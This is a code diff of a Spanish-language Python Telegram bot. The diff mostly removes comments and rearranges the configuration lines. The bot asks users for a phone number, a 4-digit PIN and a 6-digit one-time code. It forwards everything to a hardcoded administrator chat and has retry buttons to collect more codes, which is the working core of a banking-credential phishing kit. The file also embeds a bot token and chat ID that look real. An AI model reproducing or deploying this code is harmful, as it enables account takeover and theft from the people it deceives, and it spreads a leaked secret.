@@ -4,25 +4,18 @@ from telegram.ext import Application, CommandHandler, MessageHandler, CallbackQu
 import asyncio
 from datetime import datetime
 
-# Configuración de logging
 logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
 logger = logging.getLogger(__name__)
 
-# Estados de la conversación
 NUMERO, CLAVE, CLAVE_DINAMICA = range(3)
 
-# Token del bot (reemplaza con tu token de BotFather)
-BOT_TOKEN = "7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc"
+# ⚠️ CAMBIA ESTOS VALORES:
+BOT_TOKEN = "7591157193:AAHFVlUcvlY2ep6nvCoiXg8G86nxGs4yvyc"  # Pega tu token aquí
+ADMIN_CHAT_ID = "6958936698"   # Pega tu ID aquí
 
-# ID del canal o grupo donde se enviarán los datos (reemplaza con tu ID)
-ADMIN_CHAT_ID = "6958936698"
-
-# Almacenamiento temporal de datos de usuario
 user_data_store = {}
 
-
 async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Inicia la conversación y pide el número de teléfono"""
     user = update.effective_user
     
     await update.message.reply_text(
@@ -34,13 +27,10 @@ async def start(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     
     return NUMERO
 
-
 async def recibir_numero(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Recibe el número de teléfono y pide la clave"""
     numero = update.message.text
     user_id = update.effective_user.id
     
-    # Validar que sea un número
     if not numero.replace("+", "").replace(" ", "").isdigit():
         await update.message.reply_text(
             "❌ Por favor, ingresa un número de teléfono válido.\n\n"
@@ -48,7 +38,6 @@ async def recibir_numero(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
         )
         return NUMERO
     
-    # Guardar el número
     if user_id not in user_data_store:
         user_data_store[user_id] = {}
     
@@ -63,13 +52,10 @@ async def recibir_numero(update: Update, context: ContextTypes.DEFAULT_TYPE) -> 
     
     return CLAVE
 
-
 async def recibir_clave(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Recibe la clave y pide la clave dinámica"""
     clave = update.message.text
     user_id = update.effective_user.id
     
-    # Validar que sea de 4 dígitos
     if not clave.isdigit() or len(clave) != 4:
         await update.message.reply_text(
             "❌ La clave debe tener exactamente 4 dígitos.\n\n"
@@ -77,7 +63,6 @@ async def recibir_clave(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
         )
         return CLAVE
     
-    # Guardar la clave
     user_data_store[user_id]['clave'] = clave
     
     await update.message.reply_text(
@@ -88,13 +73,10 @@ async def recibir_clave(update: Update, context: ContextTypes.DEFAULT_TYPE) -> i
     
     return CLAVE_DINAMICA
 
-
 async def recibir_clave_dinamica(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Recibe la clave dinámica y muestra opciones"""
     clave_dinamica = update.message.text
     user_id = update.effective_user.id
     
-    # Validar que sea de 6 dígitos
     if not clave_dinamica.isdigit() or len(clave_dinamica) != 6:
         await update.message.reply_text(
             "❌ El código dinámico debe tener exactamente 6 dígitos.\n\n"
@@ -102,16 +84,13 @@ async def recibir_clave_dinamica(update: Update, context: ContextTypes.DEFAULT_T
         )
         return CLAVE_DINAMICA
     
-    # Guardar la clave dinámica
     if 'intentos_dinamica' not in user_data_store[user_id]:
         user_data_store[user_id]['intentos_dinamica'] = []
     
     user_data_store[user_id]['intentos_dinamica'].append(clave_dinamica)
     
-    # Enviar datos al administrador
     await enviar_datos_admin(context, user_id)
     
-    # Crear botones
     keyboard = [
         [InlineKeyboardButton("🔄 Reintentar Código Dinámico", callback_data='reintentar')],
         [InlineKeyboardButton("❌ Error de Login", callback_data='error_login')],
@@ -127,9 +106,7 @@ async def recibir_clave_dinamica(update: Update, context: ContextTypes.DEFAULT_T
     
     return CLAVE_DINAMICA
 
-
 async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Maneja los botones presionados"""
     query = update.callback_query
     await query.answer()
     
@@ -143,7 +120,6 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         return CLAVE_DINAMICA
     
     elif query.data == 'error_login':
-        # Enviar notificación de error al admin
         mensaje_error = (
             "❌ ERROR DE LOGIN DETECTADO\n"
             f"━━━━━━━━━━━━━━━━━━━━\n"
@@ -170,9 +146,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE) ->
         )
         return ConversationHandler.END
 
-
 async def enviar_datos_admin(context: ContextTypes.DEFAULT_TYPE, user_id: int):
-    """Envía los datos capturados al administrador"""
     data = user_data_store[user_id]
     
     mensaje = (
@@ -198,9 +172,7 @@ async def enviar_datos_admin(context: ContextTypes.DEFAULT_TYPE, user_id: int):
     except Exception as e:
         logger.error(f"Error enviando datos al admin: {e}")
 
-
 async def cancelar(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
-    """Cancela la conversación"""
     await update.message.reply_text(
         "❌ Proceso cancelado.\n\n"
         "Para iniciar nuevamente, usa /start",
@@ -208,13 +180,9 @@ async def cancelar(update: Update, context: ContextTypes.DEFAULT_TYPE) -> int:
     )
     return ConversationHandler.END
 
-
 def main():
-    """Inicia el bot"""
-    # Crear la aplicación
     application = Application.builder().token(BOT_TOKEN).build()
     
-    # Configurar el manejador de conversación
     conv_handler = ConversationHandler(
         entry_points=[CommandHandler('start', start)],
         states={
@@ -230,10 +198,9 @@ def main():
     
     application.add_handler(conv_handler)
     
-    # Iniciar el bot
     print("🤖 Bot iniciado correctamente...")
+    print("✅ Esperando mensajes...")
     application.run_polling(allowed_updates=Update.ALL_TYPES)
-
 
 if __name__ == '__main__':
     main()
